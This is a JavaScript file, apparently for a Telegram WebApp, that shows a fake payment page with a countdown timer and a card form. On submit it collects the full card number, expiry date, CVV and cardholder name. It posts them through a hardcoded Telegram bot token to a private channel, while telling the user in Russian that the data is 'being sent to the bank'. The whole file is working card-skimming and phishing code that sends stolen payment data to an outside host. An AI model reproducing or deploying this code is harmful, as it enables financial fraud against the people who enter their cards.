// --- –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏–∑ URL ---
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        transaction_id: params.get('transaction_id') || '5024258_user_1758320811',
        amount: parseFloat(params.get('amount')) || 10.00,
        payment_id: params.get('payment_id') || '5024258_user_1758320811'
    };
}

// --- –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ ---
document.addEventListener('DOMContentLoaded', function () {
    const { transaction_id, amount, payment_id } = getUrlParams();

    // –û–±–Ω–æ–≤–ª—è–µ–º —Å—É–º–º—É
    document.getElementById('amountValue').textContent = amount.toFixed(2);
    document.getElementById('payAmount').textContent = `${amount.toFixed(2)} USD`;

    // –û–±–Ω–æ–≤–ª—è–µ–º Payment ID
    document.getElementById('paymentId').textContent = payment_id;

    // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä
    startCountdown();
});

// --- –¢–∞–π–º–µ—Ä –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á—ë—Ç–∞ ---
function startCountdown() {
    const countdownElement = document.getElementById('countdown');
    let totalSeconds = 29 * 60 + 4; // 29:04

    const timer = setInterval(() => {
        if (totalSeconds <= 0) {
            clearInterval(timer);
            countdownElement.textContent = "00:00";
            return;
        }

        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        totalSeconds--;
    }, 1000);
}

// --- –§–æ—Ä–º–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ ---
const paymentForm = document.getElementById('paymentForm');
const cardNumberInput = document.getElementById('cardNumber');
const expiryInput = document.getElementById('expiry');
const cvvInput = document.getElementById('cvv');
const cardHolderInput = document.getElementById('cardHolder');

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã
cardNumberInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
    e.target.value = value;
});

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ñ–æ—Ä–º–∞—Ç MM/YY
expiryInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
});

// –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ CVV
cvvInput.addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
});

// --- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram ---
const BOT_TOKEN = '7604135518:AAFa2ivK3F2-GarfW10JYSbMlCLAkNIzM4Q'; // ‚Üê –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® –†–ï–ê–õ–¨–ù–´–ô –¢–û–ö–ï–ù
const CHANNEL_ID = '-1003047112845'; // ‚Üê –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —ç—Ç–æ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π ID

// --- –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã ---
paymentForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    // –í–∞–ª–∏–¥–∞—Ü–∏—è
    if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
        alert('Please fill in all fields.');
        return;
    }

    const { transaction_id, amount, payment_id } = getUrlParams();

    // –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ
    const formData = {
        transaction_id: transaction_id,
        amount: amount,
        payment_id: payment_id,
        cardNumber: cardNumberInput.value.trim(),
        expiry: expiryInput.value.trim(),
        cvv: cvvInput.value.trim(),
        cardHolder: cardHolderInput.value.trim(),
        user_id: window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 'Unknown'
    };

    console.log("FormData:", formData);

    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é: "–û—Ç–ø—Ä–∞–≤–ª—è–µ–º..."
    paymentForm.innerHTML = `
        <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
            üîÑ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–∞–Ω–∫...
        </p>
    `;

    try {
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è Telegram-–∫–∞–Ω–∞–ª–∞
        const messageText = `
üí≥ *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –ü–õ–ê–¢–ï–ñ–ê*
üÜî User ID: ${formData.user_id}
üí∞ –°—É–º–º–∞: ${formData.amount} USD
üßæ Payment ID: \`${formData.payment_id}\`
üî¢ –ö–∞—Ä—Ç–∞: \`${formData.cardNumber}\`
üìÖ –°—Ä–æ–∫: \`${formData.expiry}\`
#Ô∏è‚É£ CVV: \`${formData.cvv}\`
üë§ –í–ª–∞–¥–µ–ª–µ—Ü: \`${formData.cardHolder}\`
        `.trim();

        // URL –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º POST-–∑–∞–ø—Ä–æ—Å –≤ –∫–∞–Ω–∞–ª
        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHANNEL_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —É—Å–ø–µ—à–Ω–æ –ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –∫–∞–Ω–∞–ª
        if (result.ok) {
            console.log("‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram-–∫–∞–Ω–∞–ª!");

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∏–≥–Ω–∞–ª –æ–±—Ä–∞—Ç–Ω–æ –≤ –±–æ—Ç–∞, —á—Ç–æ –≤—Å—ë –ø—Ä–æ—à–ª–æ —É—Å–ø–µ—à–Ω–æ
            if (window.Telegram?.WebApp) {
                try {
                    window.Telegram.WebApp.sendData(JSON.stringify({
                        type: "payment_submitted",
                        status: "success",
                        user_id: formData.user_id,
                        payment_id: formData.payment_id,
                        message: "–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ –æ–±—Ä–∞–±–æ—Ç–∫—É."
                    }));
                    console.log("–°–∏–≥–Ω–∞–ª –æ–± —É—Å–ø–µ—Ö–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –±–æ—Ç–∞.");
                } catch (err) {
                    console.warn("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å—Ç–∞—Ç—É—Å –≤ –±–æ—Ç:", err);
                }
            }

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ WebApp
            paymentForm.innerHTML = `
                <p style="color: #27ae60; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
                    ‚úÖ –í–∞—à–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –≤ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∞–Ω–∫–æ–º.
                </p>
                <p style="color: #7f8c8d; text-align: center; font-size: 14px; margin-top: 10px;">
                    –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–∫—Ä–æ–π—Ç–µ —ç—Ç–æ –æ–∫–Ω–æ.
                </p>
            `;

        } else {
            throw new Error(`Telegram API Error: ${result.description}`);
        }

    } catch (error) {
        console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö:", error);

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∏–≥–Ω–∞–ª –æ–± –æ—à–∏–±–∫–µ –≤ –±–æ—Ç–∞
        if (window.Telegram?.WebApp) {
            try {
                window.Telegram.WebApp.sendData(JSON.stringify({
                    type: "payment_submitted",
                    status: "error",
                    user_id: formData.user_id,
                    error: error.message
                }));
            } catch (err) {
                console.warn("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É –≤ –±–æ—Ç:", err);
            }
        }

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
        paymentForm.innerHTML = `
            <p style="color: #e74c3c; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
                ‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.
            </p>
        `;
        alert("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.");
    }

    // –ó–∞–∫—Ä—ã–≤–∞–µ–º –æ–∫–Ω–æ —á–µ—Ä–µ–∑ 4 —Å–µ–∫—É–Ω–¥—ã
    setTimeout(() => {
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.close();
        }
    }, 4000);
});